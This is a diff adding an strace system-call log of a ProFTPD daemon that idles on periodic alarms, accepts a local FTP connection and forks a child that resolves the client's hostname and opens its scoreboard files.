@@ -1,0 +1,1481 @@
+4449  [080eca48] select(1, [0], NULL, NULL, {25, 559668}) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGALRM (Alarm clock) @ 0 (0) ---
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407444833
+4449  [080d2e1d] alarm(30)              = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d2e1d] alarm(0)               = 30
+4449  [080cbba0] time(NULL)             = 1407444834
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080ee5d4] _llseek(2, 16, [16], SEEK_SET) = 0
+4449  [080d3277] getpgrp()              = 4449
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eba4e] read(2, "", 612)       = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407444834
+4449  [080d2e1d] alarm(30)              = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0}) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGALRM (Alarm clock) @ 0 (0) ---
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407444864
+4449  [080d2e1d] alarm(30)              = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d2e1d] alarm(0)               = 30
+4449  [080cbba0] time(NULL)             = 1407444864
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080ee5d4] _llseek(2, 16, [16], SEEK_SET) = 0
+4449  [080d3277] getpgrp()              = 4449
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eba4e] read(2, "", 612)       = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407444864
+4449  [080d2e1d] alarm(30)              = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0}) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGALRM (Alarm clock) @ 0 (0) ---
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407444894
+4449  [080d2e1d] alarm(30)              = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d2e1d] alarm(0)               = 30
+4449  [080cbba0] time(NULL)             = 1407444894
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080ee5d4] _llseek(2, 16, [16], SEEK_SET) = 0
+4449  [080d3277] getpgrp()              = 4449
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eba4e] read(2, "", 612)       = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407444894
+4449  [080d2e1d] alarm(30)              = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0}) = 1 (in [0], left {7, 796497})
+4449  [080ebb56] fcntl64(0, F_GETFL)    = 0x2 (flags O_RDWR)
+4449  [080ebb56] fcntl64(0, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+4449  [080ee6ac] accept(0, 0, NULL)     = 2
+4449  [080ebc1d] pipe([3, 6])           = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [USR1 USR2 TERM CHLD], NULL, 8) = 0
+4449  [080d2ed5] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x9c938a8) = 4639
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407444916
+4449  [080eb9f7] close(6)               = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [USR1 USR2 TERM CHLD], NULL, 8) = 0
+4449  [080ebb56] fcntl64(0, F_GETFL)    = 0x802 (flags O_RDWR|O_NONBLOCK)
+4449  [080ebb56] fcntl64(0, F_SETFL, O_RDWR) = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(4, [0 3], NULL, NULL, {30, 0} <unfinished ...>
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [USR1 USR2 TERM CHLD], NULL, 8) = 0
+4639  [080eb9f7] close(3)               = 0
+4639  [080eb9f7] close(0)               = 0
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080b5a7f] rt_sigaction(SIGUSR1, {0x8048320, [USR1], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGUSR2, {0x8048290, [USR2], SA_RESTART}, {0x8048290, [USR2], SA_RESTART}, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGCHLD, {SIG_DFL, [CHLD], SA_RESTART}, {0x8048530, [CHLD], SA_RESTART}, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGHUP, {SIG_IGN, [HUP], SA_RESTART}, {0x80482f0, [HUP], SA_RESTART}, 8) = 0
+4639  [080eb9f7] close(-1)              = -1 EBADF (Bad file descriptor)
+4639  [080eb9f7] close(1)               = 0
+4639  [080ee7a2] getsockname(2, {sa_family=AF_INET, sin_port=htons(21), sin_addr=inet_addr("10.0.2.15")}, [16]) = 0
+4639  [080ee782] getpeername(2, {sa_family=AF_INET, sin_port=htons(45470), sin_addr=inet_addr("10.0.2.15")}, [16]) = 0
+4639  [080ebc01] dup2(2, 0)             = 0
+4639  [080ebc01] dup2(2, 1)             = 1
+4639  [080eb9f7] close(2)               = 0
+4639  [080ebb56] fcntl64(0, F_GETFL)    = 0x2 (flags O_RDWR)
+4639  [080ebb56] fcntl64(0, F_SETFL, O_RDWR) = 0
+4639  [080ebb56] fcntl64(1, F_GETFL)    = 0x2 (flags O_RDWR)
+4639  [080ebb56] fcntl64(1, F_SETFL, O_RDWR) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080ec87e] setresuid32(-1, 0, -1) = 0
+4639  [080ec90e] setresgid32(-1, 0, -1) = 0
+4639  [080eb9f7] close(-1)              = -1 EBADF (Bad file descriptor)
+4639  [080ee8a2] socket(PF_FILE, SOCK_DGRAM, 0) = 2
+4639  [080ebb56] fcntl64(2, F_SETFD, FD_CLOEXEC) = 0
+4639  [080ee72c] connect(2, {sa_family=AF_FILE, path="/dev/log"}, 16) = 0
+4639  [080d314a] geteuid32()            = 0
+4639  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4639  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080ee862] setsockopt(0, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+4639  [080ee862] setsockopt(1, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+4639  [080eb9f7] close(6)               = 0
+4449  [080eca48] <... select resumed> ) = 1 (in [3], left {29, 997998})
+4449  [080cbba0] time(NULL)             = 1407444916
+4449  [080eb9f7] close(3)               = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0} <unfinished ...>
+4639  [008b9b1e] open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 3
+4639  [008b8dae] fstat64(3, {st_mode=S_IFREG|0644, st_size=259, ...}) = 0
+4639  [008c68c3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a0000
+4639  [008ba17e] read(3, "127.0.0.1\tlocalhost\n127.0.1.1\txm"..., 4096) = 259
+4639  [008ba17e] read(3, "", 4096)      = 0
+4639  [008ba107] close(3)               = 0
+4639  [008c6991] munmap(0xb77a0000, 4096) = 0
+4639  [080eb8ee] open("/etc/ld.so.cache", O_RDONLY) = 3
+4639  [080eb691] fstat64(3, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4639  [080ed6e3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7793000
+4639  [080eb9f7] close(3)               = 0
+4639  [08124781] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4639  [080eb8ee] open("/lib/libnss_mdns4_minimal.so.2", O_RDONLY) = 3
+4639  [080eba4e] read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260\10\0\0004\0\0\0"..., 512) = 512
+4639  [080eb691] fstat64(3, {st_mode=S_IFREG|0644, st_size=9620, ...}) = 0
+4639  [080ed6e3] mmap2(NULL, 12388, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x110000
+4639  [080ed6e3] mmap2(0x112000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1) = 0x112000
+4639  [080eb9f7] close(3)               = 0
+4639  [080ed794] mprotect(0x112000, 4096, PROT_READ) = 0
+4639  [080ed771] munmap(0xb7793000, 56298) = 0
+4639  [080eb8ee] open("/etc/ld.so.cache", O_RDONLY) = 3
+4639  [080eb691] fstat64(3, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4639  [080ed6e3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7793000
+4639  [080eb9f7] close(3)               = 0
+4639  [08124781] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4639  [080eb8ee] open("/lib/libnss_dns.so.2", O_RDONLY) = 3
+4639  [080eba4e] read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260\v\0\0004\0\0\0"..., 512) = 512
+4639  [080eb691] fstat64(3, {st_mode=S_IFREG|0644, st_size=22036, ...}) = 0
+4639  [080ed6e3] mmap2(NULL, 20612, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb5a000
+4639  [080ed6e3] mmap2(0xb5e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4) = 0xb5e000
+4639  [080eb9f7] close(3)               = 0
+4639  [08124781] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4639  [080eb8ee] open("/lib/libresolv.so.2", O_RDONLY) = 3
+4639  [080eba4e] read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`&\0\0004\0\0\0"..., 512) = 512
+4639  [080eb691] fstat64(3, {st_mode=S_IFREG|0644, st_size=71432, ...}) = 0
+4639  [080ed6e3] mmap2(NULL, 79944, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xc24000
+4639  [080ed6e3] mmap2(0xc34000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x10) = 0xc34000
+4639  [080ed6e3] mmap2(0xc36000, 6216, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xc36000
+4639  [080eb9f7] close(3)               = 0
+4639  [080ed794] mprotect(0xc34000, 4096, PROT_READ) = 0
+4639  [080ed794] mprotect(0xb5e000, 4096, PROT_READ) = 0
+4639  [080ed771] munmap(0xb7793000, 56298) = 0
+4639  [008b9b1e] open("/etc/resolv.conf", O_RDONLY) = 3
+4639  [008b8dae] fstat64(3, {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4639  [008c68c3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a0000
+4639  [008ba17e] read(3, "# Generated by NetworkManager\nna"..., 4096) = 105
+4639  [008ba17e] read(3, "", 4096)      = 0
+4639  [008ba107] close(3)               = 0
+4639  [008c6991] munmap(0xb77a0000, 4096) = 0
+4639  [00892ead] uname({sys="Linux", node="xmenxk-laptop", ...}) = 0
+4639  [00884a81] gettimeofday({1407444916, 653042}, NULL) = 0
+4639  [008cba12] socket(PF_INET, SOCK_DGRAM|SOCK_NONBLOCK, IPPROTO_IP) = 3
+4639  [008cb51c] connect(3, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.31.248.34")}, 16) = 0
+4639  [00884a81] gettimeofday({1407444916, 653245}, NULL) = 0
+4639  [008bbfb6] poll([{fd=3, events=POLLOUT}], 1, 0) = 1 ([{fd=3, revents=POLLOUT}])
+4639  [008cb81c] send(3, "\21U\1\0\0\1\0\0\0\0\0\0\00215\0012\0010\00210\7in-addr\4a"..., 40, MSG_NOSIGNAL) = 40
+4639  [008bbfb6] poll([{fd=3, events=POLLIN}], 1, 5000) = 1 ([{fd=3, revents=POLLIN}])
+4639  [008c1e54] ioctl(3, FIONREAD, [93]) = 0
+4639  [008cb71c] recvfrom(3, "\21U\205\203\0\1\0\0\0\1\0\0\00215\0012\0010\00210\7in-addr\4a"..., 1024, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.31.248.34")}, [16]) = 93
+4639  [008d8d37] close(3)               = 0
+4639  [080eb8ee] open("/etc/ld.so.cache", O_RDONLY) = 3
+4639  [080eb691] fstat64(3, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4639  [080ed6e3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7793000
+4639  [080eb9f7] close(3)               = 0
+4639  [08124781] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4639  [080eb8ee] open("/lib/libnss_mdns4.so.2", O_RDONLY) = 3
+4639  [080eba4e] read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\t\0\0004\0\0\0"..., 512) = 512
+4639  [080eb691] fstat64(3, {st_mode=S_IFREG|0644, st_size=9624, ...}) = 0
+4639  [080ed6e3] mmap2(NULL, 12400, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe9e000
+4639  [080ed6e3] mmap2(0xea0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1) = 0xea0000
+4639  [080eb9f7] close(3)               = 0
+4639  [080ed794] mprotect(0xea0000, 4096, PROT_READ) = 0
+4639  [080ed771] munmap(0xb7793000, 56298) = 0
+4639  [008cba12] socket(PF_FILE, SOCK_STREAM, 0) = 3
+4639  [008ba746] fcntl64(3, F_GETFD)    = 0
+4639  [008ba746] fcntl64(3, F_SETFD, FD_CLOEXEC) = 0
+4639  [008cb51c] connect(3, {sa_family=AF_FILE, path="/var/run/avahi-daemon/socket"}, 110) = 0
+4639  [008ba746] fcntl64(3, F_GETFL)    = 0x2 (flags O_RDWR)
+4639  [008b8dae] fstat64(3, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
+4639  [008c68c3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a0000
+4639  [008ca4b7] _llseek(3, 0, 0xbff51e1c, SEEK_CUR) = -1 ESPIPE (Illegal seek)
+4639  [008ba1fe] write(3, "RESOLVE-ADDRESS 10.0.2.15\n", 26) = 26
+4639  [008ba17e] read(3, "+ 2 0 xmenxk-laptop.local\n", 4096) = 26
+4639  [008ba107] close(3)               = 0
+4639  [008c6991] munmap(0xb77a0000, 4096) = 0
+4639  [08124684] stat64("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4639  [08124684] stat64("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4639  [008b9b1e] open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 3
+4639  [008b8dae] fstat64(3, {st_mode=S_IFREG|0644, st_size=259, ...}) = 0
+4639  [008c68c3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a0000
+4639  [008ba17e] read(3, "127.0.0.1\tlocalhost\n127.0.1.1\txm"..., 4096) = 259
+4639  [008ba17e] read(3, "", 4096)      = 0
+4639  [008ba107] close(3)               = 0
+4639  [008c6991] munmap(0xb77a0000, 4096) = 0
+4639  [008cba12] socket(PF_FILE, SOCK_STREAM, 0) = 3
+4639  [008ba746] fcntl64(3, F_GETFD)    = 0
+4639  [008ba746] fcntl64(3, F_SETFD, FD_CLOEXEC) = 0
+4639  [008cb51c] connect(3, {sa_family=AF_FILE, path="/var/run/avahi-daemon/socket"}, 110) = 0
+4639  [008ba746] fcntl64(3, F_GETFL)    = 0x2 (flags O_RDWR)
+4639  [008b8dae] fstat64(3, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
+4639  [008c68c3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a0000
+4639  [008ca4b7] _llseek(3, 0, 0xbff52488, SEEK_CUR) = -1 ESPIPE (Illegal seek)
+4639  [008ba1fe] write(3, "RESOLVE-HOSTNAME-IPV4 xmenxk-lap"..., 42) = 42
+4639  [008ba17e] read(3, "+ 2 0 xmenxk-laptop.local 10.0.2"..., 4096) = 36
+4639  [008ba107] close(3)               = 0
+4639  [008c6991] munmap(0xb77a0000, 4096) = 0
+4639  [080d314a] geteuid32()            = 65534
+4639  [080d316a] getegid32()            = 65534
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080ec87e] setresuid32(-1, 0, -1) = 0
+4639  [080ec90e] setresgid32(-1, 0, -1) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080d313a] getuid32()             = 0
+4639  [080d313a] getuid32()             = 0
+4639  [080d31a7] setuid32(0)            = 0
+4639  [080d3207] setgid32(65534)        = 0
+4639  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080ec87e] setresuid32(-1, 0, -1) = 0
+4639  [080ec90e] setresgid32(-1, 0, -1) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080eb965] open("/usr/local/var/proftpd.delay", O_RDWR|O_LARGEFILE) = 3
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080d314a] geteuid32()            = 0
+4639  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4639  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4639  [080d2e1d] alarm(0)               = 0
+4639  [080cbba0] time(NULL)             = 1407444916
+4639  [080d2e1d] alarm(300)             = 0
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080ec87e] setresuid32(-1, 0, -1) = 0
+4639  [080ec90e] setresgid32(-1, 0, -1) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080eb6d1] lstat64("/usr/local/var/proftpd.scoreboard", {st_mode=S_IFREG|0644, st_size=16, ...}) = 0
+4639  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_CREAT|O_LARGEFILE, 0644) = 6
+4639  [080eb8a1] fchmod(6, 0644)        = 0
+4639  [080eba4e] read(6, "\357\276\255\336\3\0\4\1a\21\0\0%\347\343S", 16) = 16
+4639  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4639  [080d314a] geteuid32()            = 0
+4639  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4639  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
